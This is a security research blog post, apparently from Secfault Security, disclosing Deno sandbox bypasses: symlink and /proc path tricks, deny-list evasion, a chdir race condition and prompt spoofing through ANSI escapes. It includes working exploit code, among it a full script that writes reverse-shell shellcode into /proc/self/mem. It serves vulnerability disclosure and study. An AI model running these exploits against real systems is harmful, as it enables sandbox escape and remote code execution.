---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-04-23_deno-digging-tunnels-out-of-a-js-sandbox.md
original_filename: 2024-04-23_deno-digging-tunnels-out-of-a-js-sandbox.md
title: 'Deno: Digging Tunnels out of a JS Sandbox'
category: documents
detected_topics:
- race-condition
- access-control
- command-injection
- automation-abuse
- api-security
- supply-chain
tags:
- imported
- documents
- race-condition
- access-control
- command-injection
- automation-abuse
- api-security
- supply-chain
language: en
raw_sha256: 979b5ada69345a8dd5e6bef232cc1979350bdbf988b014537ec7c2b4b0d03276
text_sha256: 4b5dff39bd618f0df2d23d2f6bf3d68ca8f6c0c0fcd5ef30b87821b990a51ff5
ingested_at: '2026-06-28T07:32:33Z'
sensitivity: unknown
redactions_applied: false
---

# Deno: Digging Tunnels out of a JS Sandbox

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-04-23_deno-digging-tunnels-out-of-a-js-sandbox.md
- Source Type: markdown
- Detected Topics: race-condition, access-control, command-injection, automation-abuse, api-security, supply-chain
- Ingested At: 2026-06-28T07:32:33Z
- Redactions Applied: False
- Raw SHA256: `979b5ada69345a8dd5e6bef232cc1979350bdbf988b014537ec7c2b4b0d03276`
- Text SHA256: `4b5dff39bd618f0df2d23d2f6bf3d68ca8f6c0c0fcd5ef30b87821b990a51ff5`


## Content

---
title: "Deno: Digging Tunnels out of a JS Sandbox"
page_title: "Secfault Security - Deno: Digging Tunnels out of a JS Sandbox"
url: "https://secfault-security.com/blog/deno.html"
final_url: "https://secfault-security.com/blog/deno.html"
authors: ["finn", "lx", "olli"]
programs: ["Deno"]
bugs: ["V8 JavaScript engine", "JS sandbox breakout"]
publication_date: "2024-04-23"
added_date: "2024-05-11"
source: "pentester.land/writeups.json"
original_index: 324
---

![](../images/logo.png)

[Home](../index.html) [Company](../company.html) [Services](../services.html) [Trainings](../trainings.html) [Jobs](../jobs.html) [Blog](../blog.html) [Contact](../contact.html)

# Deno: Digging Tunnels out of a JS Sandbox

Posted on April 23, 2024 by finn, lx, olli

Both [Deno](https://deno.com) and Node.js are runtimes for JavaScript, TypeScript, and WebAssembly based on V8. Ryan Dahl, the founder of Node.js, announced Deno during his talk at the JsConf EU 2018 with the title [10 Things I Regret About Node.js](https://youtu.be/M3BM9TB-8yA). One major goal of Deno was creating a more secure version of Node.js with a security model based on a sandbox that can restrict file system and network accesses. Therefore, we focused on analyzing the sandbox in more detail during our internal research time at Secfault Security.

This blog post tells the journey of unearthing a few different vulnerabilities in Deno.

Pick up your shovels and be ready to get dirty!

## Quick Intro and Overview

Deno is no drop-in replacement for node, it can’t be, considering its goals.

If your application performs actions that could be dangerous, such as reading files or executing binaries, you must specify what it may and may not do. In the case of Deno, you can configure a sandbox to define which actions are allowed. Now that there is a sandbox mechanism, it is an obvious thing to play with it. But first, let us show you how you can pass arguments to `deno` to configure the sandbox for your application:
  
  
  # Allow a single file to be read
  deno run --allow-read=/tmp/foo app.js
  
  # Allow reading all files, except one
  deno run --allow-read --deny-read=/tmp/foo app.js
  
  # Allow network access for multiple hosts
  deno run --allow-net=github.com,deno.land app.js
  
  # Allow whoami to be executed
  deno run --allow-run=whoami app.js

There are further permissions which can give you access to other resources and functionality, e.g., `--allow-env` and `--allow-hrtime`, but you probably get the idea here.

If you feel you need a more thorough intro, [this](https://docs.deno.com/runtime/manual/basics/permissions) is a good starting point in the documentation.

Instead of `deno run [...] app.js` you can also use `deno repl [...]` to get an interactive shell. Most of the screenshots in this blog post show an interaction with the Deno repl.

As there are many ways to play around with these permissions, let us provide a short overview of this article:

  * Symlinks and Deno… How Deno handles symlinks and how we discovered the first issue.
  * Starting To See a Pattern Using symlinks to bypass a read deny list.
  * How Does the Deno Sandbox Work? Examining the sandbox’s functionality.
  * Deny Lists Bypassing different deny lists.
  * Finding the Right Problem for Our Solution Abusing symlinks to gain additional run permissions.
  * Exploiting a Race Condition To Gain Code Execution Discovering a race condition leading to arbitrary read and write permissions and finally to code execution.

Please note that the findings described in this post refer to Deno version `1.39.4`. The race condition issue was also present in version `1.42.1`, but no extensive checks for other versions have been performed.

## Symlinks and Deno…

Symlinks are interesting as they are not easy to handle. We’ve all seen tons of bugs involving symlinks in various software. And of course Deno is no exception: symlinks have caused trouble in the past, for example there was a [file system sandbox escape](https://nvd.nist.gov/vuln/detail/CVE-2021-41641). We have therefore decided to take a closer look at how Deno handles symlinks.

It sounds like whereever you have read and/or write permissions, you could `Deno.symlink("/","./foo")` to get access to the full system. It appears that this caused Deno to only allow `Deno.symlink()` if you have full read and write permissions, i.e., `--allow-read --allow-write`.

Knowing this going into the research, we focused heavily on the file system and symlinks in particular.

Soon we discovered the first minor flaw. If you only had read permissions in the current directory, but it contained a symlink to `/tmp` for example, you could traverse out of that symlink using code like `Deno.readTextFileSync("./link2tmp/../etc/passwd")`.

![](../images/deno/deno-tmp-dotdot.png)

You can actually take this further and turn any symlink to a directory into a full file system bypass. We won’t spoil exactly how yet, a similar trick will come in handy later!

But of course, relying on the presence of a symlink to a directory outside of the application is not really a significant attack.

## Starting To See a Pattern

The initial observations however do beg the question: can we take this any further? And how exactly does the Deno sandbox work in the first place?

In a first step, we explored our systems to find interesting symlinks, thinking maybe we can do some trickery with those. After some digging `/proc/self/root/` showed up, which is a symlink to `/`. We came up with the following test setup. Consider an app is running with the following permissions:
  
  
  deno run --allow-read --deny-read=/etc/passwd app.js

This means the app can read everything, except for `/etc/passwd`. Let’s try to read it with the symlink in the path.

![](../images/deno/deno-procselfroot.png)

So simply by accessing `/proc/self/root/etc/passwd` we bypassed `--deny-read` by confusing Deno with existing symlinks!

## How Does the Deno Sandbox Work?

The above observations of course increased our interest in the inner workings of the Deno sandbox. And needless to say, we also tried a lot of things that failed. For instance, `/etc/././///passwd` does not bypass `--deny-read=/etc/passwd`. Neither does injecting nullbytes, `\r` or `\t`.

Even without looking into the code you might be able to figure out the root cause of this issue already. The file sandbox works by normalizing paths and then comparing them against allow/deny lists. And the issue is that this normalization ignores symlinks! Actually, this appears to be the general concept of the sandbox: Inputs to certain functions are compared against allow/deny lists. There is no container or firewall, you’re just limited in what kind of values you can pass to specific functions.

## Deny Lists

Equipped with this knowledge, let’s quickly go over a few ways to bypass deny lists.

  1. `--allow-write=. --deny-write=./foo/bar`  
We now know this means that you are not allowed to pass a path that normalizes to `/path/to/app/foo/bar` into the `write`-style functions. Well, just rename the parent directory `foo` to something else. Then write to bar. Then rename the parent directory back to `foo`. Nowhere in this process did you ever touch a file with the path `/path/to/app/foo/bar`.
  2. `--allow-net --deny-net=1.2.3.4`  
Nope, you can’t use `01.02.03.04`, it is normalized again. You can, however, just use a domain that resolves to that IP, like `1.2.3.4.nip.io`.
  3. Missing `--allow-env` or `--deny-env=FOO`  
It’s not the first time that we’ve written a bug report explaining that reading `/proc/self/environ` can interfere with hidden environment variables. Can you even properly hide environment variables from subprocesses?

Can they even all be called a bug? We think so. As a user, would you expect that you also have to deny write access to the parent directory of a file you want to protect? Or that `--allow-read=/` is the same as `--allow-read=/ --allow-env`?

Is it a bug that `--allow-run --deny-run=sudo` can be bypassed with `Deno.run({cmd:["sh", "-c", "sudo", "foobar"}]})`? Maybe, but that’s kind of by design. But, how do you use `--deny-run` correctly then?

We would argue that a flag like `--deny-env=FOO` creates an expectation for a developer, that their environment variable `FOO` is hidden and they build software based on this (sometimes) wrong assumption.

A lot of behavior we have seen exists on a slim line between misconfiguration and vulnerability. Who is responsible? Deno or the individual devs using it? We often observe such things with permission systems, they are complex.

## Finding the Right Problem for Our Solution

Great, deny lists can be bypassed. That’s not too unexpected for experienced readers, presumably. Let’s dig deeper.

We observed that you could traverse out of the allowed directory and back inside. For instance, if the current directory is called `allowed` and `./foo.txt` is readable, then reading `../allowed/foo.txt` is allowed.

What happens if we introduce a symlink to the mix? Since we’re at, say, `/var/web/allowed`, let’s imagine there is a symlink to `/home/user/.local/bin/` at `/var/web/link`.  
You could now try to access `../link/../allowed/foo`. Deno would normalize this to `/var/web/allowed/foo`, but in reality, it is `/home/user/.local/allowed/foo`.

However, this alone is not exploitable for most types of attacks, because you’d have to be very lucky to find:

  * a fitting symlink, that points to
  * a directory below a directory with the same name as your directory, which in turn
  * contains a sensitive file.

After a while of hanging out in a voice chat with the others to exploit our “leftovers” (observations and lame bugs) at the end of our research time, we figured that this behavior can actually be used to escalate `--allow-run=something` to `--allow-run`.

Consider an application that is allowed to run `whoami`, can read all files and write to the current directory. It may look like this:
  
  
  deno run --allow-read --allow-write=. --allow-run=whoami app.js

And once again,`/proc` turns out to be extremely helpful, as it provides a symlink to the current working directory.

Now, to exploit the behavior above, there are 3 steps:

  * Place a binary at `./usr/bin/whoami` (i.e., in your writable area)
  * Create `./a/b/c/` and `Deno.chdir` into `./a/b/c`
  * Now call: `Deno.run({cmd:["/proc/self/cwd/../../../usr/bin/whoami"])`

`/proc/self/cwd/` is a symlink to the current working directory. We just `Deno.chdir`’d into `./a/b/c/` so that’s where `/proc/self/cwd/` points. From there, `../../../usr/bin/whoami` is still inside the app directory, it is the binary we just placed there. But since the path normalization ignores symlinks, it normalizes the path into `/usr/bin/whoami` and thinks that is what we run! Then it passes our unnormalized input into whatever function it internally uses to run programs.

Below you can find an implementation that runs `touch /tmp/jrn` if `whoami` is allowed to run.
  
  
  // Exploit to run any program from --allow-read --allow-write=. --allow-run=whoami
  Deno.mkdirSync("a/b/c/", {recursive: true})
  Deno.mkdirSync("usr/bin", {recursive: true})
  Deno.copyFileSync("/usr/bin/touch","usr/bin/whoami")
  Deno.chdir("a/b/c")
  Deno.run({cmd:["/proc/self/cwd/../../../usr/bin/whoami", "/tmp/jrn"]})

After running this code, you’ll find that `touch /tmp/jrn` has been executed.

`/proc` for the win, once again!

## Exploiting a Race Condition To Gain Code Execution

Okay, now let’s get to the most severe vulnerability and explain how one can obtain arbitrary write permissions and turn these into arbitrary code execution for the following sandbox settings:
  
  
  deno run --allow-read=. --allow-write=. app.js

### Discovery of the Race Condition

While analyzing the path normalization, we realized that before accessing a file with a relative path, Deno would somehow have to turn this relative path into an absolute one. It is fair to assume that this is done by basically prepending the current working directory to the provided relative path. Based on these thoughts it was quite natural to wonder if that would also work in a concurrent setting. While playing around with this idea, we found that there is indeed a race condition between changing directories using `Deno.chdir()` and file access checks. This is best illustrated by the below example.

Let us start the `deno repl` as follows:
  
  
  mkdir /tmp/inside
  cd /tmp
  DENO_NO_PROMPT=1 deno repl --allow-read=.

It should not be possible to read `/etc/passwd` as our current working directory is `/tmp` in this setup. For instance, reading from `../etc/passwd` should fail - because `../etc/passwd` would resolve to `/tmp/../etc/passwd`, which would be normalized to `/etc/passwd`.

In contrast, if our current working directory is `/tmp/inside`, then accessing `../etc/passwd` would be permitted - because `../etc/passwd` would now resolve to `/tmp/inside/../etc/passwd`, which would be normalized to `/tmp/etc/passwd`.

However, if we rapidly change the current working directory between `/tmp` and `/tmp/inside` it can happen that our current working directory is `/tmp/inside` during the permission check, while our current working directory is `/tmp` when we are reading `../etc/passwd`.

Let us really make clear what is going here. The general observation is that the issue is a Time-of-Check/Time-of-Use (ToCToU) problem. As many issues of this class, this one originates from the fact that two consecutive steps are executed on a resource that might change in between such steps.

In this case, the race condition is made possible by setting the current working directory twice in a `Deno.readTextFile("../etc/passwd")` call, once before the permission check and a second time before the read access, and normalizing the relative path with respect to the current working directory to an absolute path each time.

Running the following code in the repl demonstrates this behavior and leaks the content of `/etc/passwd`:
  
  
  function bar() {
  for(let i = 0; i < 100; i++) {
  Deno.chdir("/tmp")
  Deno.chdir("/tmp/inside")
  }
  }
  
  async function foo() {
  try {
  let x = await Deno.readTextFile("../etc/passwd")
  console.log(x)
  } catch {}
  }
  
  setInterval(bar, 0)
  setInterval(foo, 69)

Now, let us recap what we have gained. We had read permissions for our current working directory `/tmp` and were able to read the file `/etc/passwd` which is outside of `/tmp`.

It is important to think about what preconditions must be met for this attack to work. One important prerequisite was a suitable file structure, this was the existence of a subdirectory of our current working directory.

Generally speaking, the depth of chained subdirectories has to be the same as the number of directories that we want to go upwards with respect to our current working directory.

Let us give another example. Let us assume that our current working directory is `/u1/u2/u3/u4` and that the sandbox is configured as
  
  
  deno repl --allow-read=/u1/u2/u3/u4

Now we want to exploit the bug to read `/etc/passwd`. The relative path `../../../../etc/passwd` is resolved to `/u1/u2/u3/u4/../../../../etc/passwd` and thus normalized to `/etc/passwd` which is exactly what we want to read but are not allowed to read. Using this relative path means that we have to go four levels upwards before going downwards. Therefore, we need a chain of four nested subdirectories with respect to our current working directory `/u1/u2/u3/u4`, for example the file structure could be `/u1/u2/u3/u4/s1/s2/s3/s4`.

If we change our current working directory to `/u1/u2/u3/u4/s1/s2/s3/s4`, the permission check for `../../../../etc/passwd` would succeed as the path is normalized to `/u1/u2/u3/u4/etc/passwd` which we are allowed to read. To exploit the bug, we call `Deno.readTextFile("../../../../etc/passwd")` and change our current working directory rapidly between `/u1/u2/u3/u4` and `/u1/u2/u3/u4/s1/s2/s3/s4`.

However, if all chains of nested subdirectories of the current working directory are shorter than the number of levels we want to go upwards using `../`, then we need to have write permissions in the current working directory to create the desired chain of nested subdirectories. Therefore, we are able to gain arbitrary read permissions if the sandbox is configured as follows:
  
  
  deno repl --allow-read=. --allow-write=.

As this bug does not only affect `Deno.readTextFile()`, but also other methods like `Deno.open()`, we have gained arbitrary read and write permissions!

### Turning Arbitrary Write Permissions into Code Execution

Now, let us think about how we can use arbitrary write permissions to get code execution.

One way would be overwriting files which are invoked by the OS such as `.bashrc`, `.bash-profile` or `.profile`. However, there is a much more direct way to get code execution…

While reading up about Deno we came across [this writeup](https://brycec.me/posts/dicectf_2022_writeups#denoblog) for the challenge denoblog of the DiceCTF 2022. In this challenge one had arbitrary write but no `allow-run` permissions. The author of the writeup used a well-known technique to get code execution where the instructions of the function `Builtins_JsonStringify()` were overwritten with custom shellcode by writing to `/proc/self/mem` and the shellcode was triggered by calling `Builtins_JsonStringify()`.

Before we continue we would like to highlight the following question: Why is it possible to write to write-protected pages by writing to the file `/proc/self/mem`?

Let us refer to the great article [Linux Internals: How /proc/self/mem writes to unwritable memory](https://offlinemark.com/2021/05/12/an-obscure-quirk-of-proc/) to answer this question. In summary, the kernel can remap the physical frame, which corresponds to the virtual address we want to access, into its own virtual address space with write permissions.

Luckily the same approach works for us, _joink_. In total, our exploit consists of the following steps:

  * Abuse the race condition twice 
  * Once to read `/proc/self/maps`
  * And a second time get a handle with write access to `/proc/self/mem`
  * Patch the Deno process in memory 
  * Get the base address of the `deno` process’ memory by “parsing” `/proc/self/maps`
  * Compute the constant offset to the function `Builtins_JsonStringify()`
  * Overwrite the instructions of `Builtins_JsonStringify()` with shellcode that pops a reverse shell
  * Call `Builtins_JsonStringify()` to run the shellcode

Here is our full exploit for Deno version `1.42.1` and Linux/AMD64. Please note that the offset `0x128b200` to `Builtins_JsonStringify()` has to be modified for other versions than `1.42.1`. Run
  
  
  $ deno run --allow-read=. --allow-write=. exploit.ts

where `exploit.ts` contains the following code
  
  
  // data for the reverse shell
  const ip_addr = "127.0.0.1"
  const port  = "4444"
  
  function get_shellcode() {
  let ip_addr_hex = ip_addr.split('.').map(part => String.fromCharCode(parseInt(part, 10))).join('');
  let port_hex = String.fromCharCode((port >> 8) & 0xFF, port & 0xFF);
  
  // shellcode for a reverse shell connecting to ip_addr:port
  let shellcode =
  "\x48\x31\xC0\x48\x31\xFF\x48\x31\xF6\x48\x31\xD2\x4D\x31\xC0\x6A\x02\x5F\x6A\x01\x5E\x6A\x06\x5A\x6A\x29\x58\x0F\x05" +
  "\x49\x89\xC0\x48\x31\xF6\x4D\x31\xD2\x41\x52\xC6\x04\x24\x02\x66\xC7\x44\x24\x02" + port_hex + "\xC7\x44\x24\x04" + ip_addr_hex +
  "\x48\x89\xE6\x6A\x10\x5A\x41\x50\x5F\x6A\x2A\x58\x0F\x05\x48\x31\xF6\x6A\x03\x5E\x48\xFF\xCE\x6A\x21\x58\x0F\x05\x75\xF6" +
  "\x48\x31\xFF\x57\x57\x5E\x5A\x48\xBF\x2F\x2F\x62\x69\x6E\x2F\x73\x68\x48\xC1\xEF\x08\x57\x54\x5F\x6A\x3B\x58\x0F\x05";
  
  let shellcode_arr = new Uint8Array(shellcode.length);
  
  for (let i = 0; i < shellcode.length; i++) {
  shellcode_arr[i] = shellcode.charCodeAt(i);
  }
  
  return shellcode_arr;
  }
  
  function wait_for_non_null_value(fn) {
  let interval_time_ms = 89;
  return new Promise((resolve) => {
  const interval_id = setInterval(async () => {
  const result = await fn();
  if (result !== null) {
  clearInterval(interval_id);
  resolve(result);
  }
  }, interval_time_ms);
  });
  }
  
  function change_dirs(old_cwd) {
  for (let i = 0; i < 100; i++) {
  Deno.chdir(old_cwd);
  Deno.chdir(old_cwd + "/s/e/c/f/a/u/l/t/s/e/c/u/r/i/t/y");
  }
  }
  
  function rapidly_change_dirs(old_cwd) {
  let interval;
  
  return {
  start: () => {
  interval = setInterval(change_dirs, 0, old_cwd);
  },
  stop: () => {
  clearInterval(interval);
  },
  };	
  }
  
  async function get_proc_maps() {
  let maps = null;
  try {
  maps = await Deno.readTextFile("../../../../../../../../proc/self/maps");
  } catch {}
  return maps;
  }
  
  async function get_proc_mem(maps) {
  let mem_file = null;
  try {
  mem_file = await Deno.open("../../../../../../../../proc/self/mem", { write: true });
  return mem_file.rid;
  } catch {}
  return null;
  }
  
  async function pwn() {
  console.log("[𝝺] sploit heaping up");
  
  // get cwd and create a deep directory structure
  let old_cwd = Deno.cwd();
  await Deno.mkdir("s/e/c/f/a/u/l/t/s/e/c/u/r/i/t/y", { recursive: true });
  
  // start changing directories rapidly to confuse deno
  let start_stop_change_dirs = rapidly_change_dirs(old_cwd);
  start_stop_change_dirs.start();
  
  (async () => {
  
  // get /proc/self/maps
  console.log("[𝝺] waiting to read /proc/self/maps");
  let maps = await wait_for_non_null_value(get_proc_maps);
  
  // get /proc/self/mem
  console.log("[𝝺] got /proc/self/maps, waiting for fd to /proc/self/mem");
  let mem = await wait_for_non_null_value(get_proc_mem);
  console.log("[𝝺] got fd for /proc/self/mem:", mem)
  
  // stop changing directories rapidly
  start_stop_change_dirs.stop();
  
  // extract the base address of deno based on /proc/self/maps
  let line = maps.split("\n").find(l => l.includes("deno") && l.includes("r-x"));
  let base = parseInt(line.split(" ")[0].split("-")[0], 16);
  let addr_stringify = base + 0x128b200; // offset for version 1.42.1
  
  console.log("[𝝺] base address deno: 0x" + (base).toString(16));
  console.log("[𝝺] address of Builtins_JsonStringify: 0x" + (addr_stringify).toString(16));
  await Deno.seek(mem, addr_stringify, Deno.SeekMode.Start);
  
  // write shellcode
  let shellcode_arr = get_shellcode();
  await Deno.write(mem, shellcode_arr);
  console.log("[𝝺] placed the shellcode successfully, pwn incoming...")
  JSON.stringify("JRN");
  
  })();
  }
  
  pwn()

## Disclosure and Deno Deploy

We disclosed all issues described here to Deno. Deno was so kind to let us test these attacks on their cloud environment “Deno Deploy”. This is a different runtime based on “deno_core”, so (most of) our findings did not work there. One important difference is the use of a virtual file system, which prevents writing to e.g., `/proc/self/mem` with the usual file system methods.

## Bonus Bug

While writing the blog post we came across [CVE-2023-28446](https://leodog896.com/article/deno-ansi-injection).

It’s an ANSI escape sequence injection attack to spoof prompts. Just for fun, we decided to look at the fix for this issue. TL;DR: Deno now uses a library to strip escape sequences. The code actually parses escape sequences and then removes them from the string being displayed.

This might sound like a sensible idea at first, but there is one significant shortcoming: The fix currently strips all escape sequences from the user-controlled parts of the output, before rendering the authorization prompt. However, after the user confirmed the prompt, the _unstripped_ version of the provided data is used. By stripping out the escape sequence, Deno therefore actually also hides some parts of the file path it is trying to display.

The following screenshot illustrates the problem.

![](../images/deno/deno-prompt-spoof.png)

And after accepting this benign request for reading `./foo/bar`, the code can actually read all files.

![](../images/deno/deno-prompt-spoof-accepted.png)

The file name used here is `./foo/bar"\x1b];../../../../../../../../../../../\x07\x1b/..`.

First of all, one might notice that there is a double quote character in the file name. The reason for this will become clear in a second.

The `\x1b];../../../../../../../../../../../\x07` part in the file name is the escape sequence that is used to hide the main part of the file name, namely the `../` sequence. If this sequence was not stripped out of the prompt, the user would likely notice that something shady is going on.

After this first escape sequence, the file name contains a second escape sequence, namely `\x1b/..`. This escape sequence is actually not syntactically correct. It will therefore _not_ be removed from the output, but instead it _will_ be printed to the terminal. However, the terminal will not be able to interpret this escape sequence, so no actual output will be generated; instead, the output will simply be truncated, and no characters following this escape sequence will be shown.

This comes in very handy, because when interpreted as a file name, the escape sequence `\x1b];../../../../../../../../../../../\x07` would refer to a file named `../../../../../../../../../../\x07`. This is close, but not exactly what we need for a successful attack. The `\x07` at the end somehow has to be removed. And this is precisely where the second (broken) escape sequence comes into play: it adds another `../` to the file name.

And this is also the reason for the double quote character in the file name: after the broken escape sequence, no further characters will be shown, not even the closing double quote character that Deno appends to the prompt. So in order to fix the prompt, we simply add our own closing quote.

As you can see, when the prompt is closed, the escape sequence is rendered, which breaks the terminal output around our path. Your terminal might have a new title as well, as this is what the escape sequence was for. But that doesn’t matter, as the user still just accepted a path that normalizes to `/`. The same works with write access: you’re asked if the app can write to `./foo/bar` and end up allowing it to run code by writing to `/proc/self/mem` like in the race condition exploit.

It appears that this last issue has been independently identified by [RyotaK](https://twitter.com/ryotkak); two weeks after reporting the issue to Deno, an [advisory](https://github.com/denoland/deno/security/advisories/GHSA-m4pq-fv2w-6hrw) describing the problem was published.

© 2016 - 2026 Secfault Security GmbH | [Imprint](../imprint.html)
